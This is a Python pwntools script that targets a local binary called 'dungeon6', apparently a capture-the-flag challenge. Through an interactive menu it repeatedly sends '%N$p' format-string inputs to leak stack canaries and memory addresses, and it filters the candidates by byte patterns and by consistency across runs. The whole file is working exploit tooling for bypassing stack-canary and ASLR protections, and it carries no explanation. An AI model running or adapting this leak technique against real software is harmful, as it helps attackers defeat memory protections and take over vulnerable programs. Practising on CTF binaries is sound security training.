from pwn import *
import signal
import sys

context.log_level = 'error'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./dungeon6', checksec=False)

def signal_handler(sig, frame):
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

while True:
    print("Please select an option: ")
    print("1. Find the canary")
    print("2. Find a leaked address")
    print("3. Go back")
    option = input("Your choice: ").strip()

    # Option 1: Find the canary
    if option == '1':
        while True:
            potential_canaries = []
            for i in range(1, 101):
                try:
                    p = process(elf.path)
                    p.sendline('%{}$p'.format(i).encode())
                    p.recvline()

                    result = p.recvline().decode().strip()

                    if result.endswith('00') and not result.startswith('f7') and not result.startswith('7f'):
                        print(str(i) + ': ' + str(result).strip())
                        potential_canaries.append((i, result))

                    p.close()
                except EOFError:
                    pass

            print(f"\nThese are the potential canary addresses\n")
            for idx, (pos, canary) in enumerate(potential_canaries):
                print(f"{idx+1}: Position = {pos}, Canary = {canary}")

            choice = input("Choose a canary (Enter number, r to rerun, b to go back): ").strip()

            if choice.lower() == 'r':
                continue
            elif choice.lower() == 'b':
                break
            else:
                chosen_canary = potential_canaries[int(choice)-1]
                print(f"You have chosen: Position = {chosen_canary[0]}, Canary = {chosen_canary[1]}")
                break

    elif option == '2':
        # Option 2: Find a leaked address
        while True:
            potential_addresses = []

            for i in range(1, 31):
                try:
                    last_values = []

                    # We need to run this multiple times for a single i to check consistency
                    for _ in range(5):
                        # Create process
                        p = process(elf.path)
                        p.sendline('%{}$p'.format(i).encode())
                        p.recvline()

                        result = p.recvline().decode().strip()

                        if result and result != "(nil)" and len(result) >= 4:
                            last_two = result[-2:]  # get the last 2 digits
                            consecutive_zeros = result.count('00')

                            if last_two != 'ff' and consecutive_zeros <= 9:
                                last_values.append(last_two)

                        # If we've run it 5 times and the last 2 digits stayed the same, print it
                        if len(last_values) == 5 and len(set(last_values)) == 1:
                            print(str(i) + ': ' + result)
                            potential_addresses.append((i, result))

                        p.close()
                except EOFError:
                    pass

            print(f"\nThese are the potential leaked addresses\n")
            for idx, (pos, addr) in enumerate(potential_addresses):
                print(f"{idx+1}: Position = {pos}, Leaked address = {addr}")

            choice = input("Choose a leaked address (Enter number, r to rerun, b to go back): ").strip()

            if choice.lower() == 'r':
                continue
            elif choice.lower() == 'b':
                break
            else:
                chosen_addr = potential_addresses[int(choice)-1]
                print(f"You have chosen: Position = {chosen_addr[0]}, Leaked address = {chosen_addr[1]}")
                break

    elif option == '3':
        break
    else:
        print("Invalid option!")
